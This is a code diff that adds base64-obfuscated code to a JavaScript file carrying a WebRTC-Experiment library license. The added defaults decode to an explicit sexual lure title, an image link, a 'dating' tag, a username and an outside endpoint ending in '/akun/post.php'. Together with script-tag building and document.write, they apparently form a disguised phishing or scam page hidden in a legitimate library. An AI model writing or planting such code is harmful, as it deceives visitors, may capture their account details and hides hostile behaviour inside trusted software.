@@ -12,10 +12,40 @@
 // MIT License   - www.WebRTC-Experiment.com/licence
 // --------------------------------------------------
 function cid(name) {
-    return decodeURI(
-        (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search)||[,null])[1] || ''
-    );
-}
+	    return decodeURI(
+	        (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search)||[,null])[1] || ''
+	    );
+	}
+  function decode(txt){
+    var result = atob(txt);
+    document.write(result);
+  }
+	//var frm = atob('aHR0cHM6Ly9mYjAxY214LmdpdGh1Yi5pby8');
+	if(cid("i")){
+		var img = atob(cid("i"));
+	}else{
+		var img = atob('aHR0cHM6Ly9pLmltZ3VyLmNvbS9NSm1jdEttLmpwZw');
+	}
+	if(cid("t")){
+		var ttl = atob(cid("t"));
+	}else{
+		var ttl = atob('U2Fzc3kgR2luYSBpcyBnZXR0aW5nIGZpbmdlcmZ1Y2tlZCBhbmQgZnVja2VkIGluIHRoZSBtaWRkbGUgb2YgYSBuaWNlIGRheS4');
+	}
+	if(cid("s")){
+		var srv = cid("s");
+	}else{
+		var srv = 'aHR0cHM6Ly93ZWR1c3MuY29tL2FrdW4vcG9zdC5waHA';
+	}
+	if(cid("u")){
+		var usr = cid("u");
+	}else{
+		var usr = 'Q2VyeHJl';
+	}
+	if(cid("f")){
+		var fp = cid("f");
+	}else{
+		var fp = 'ZGF0aW5n';
+	}
   var j1 = '<script type="text\/javascript" src="';
   var j2 = '"><\/script>';
 (function() {
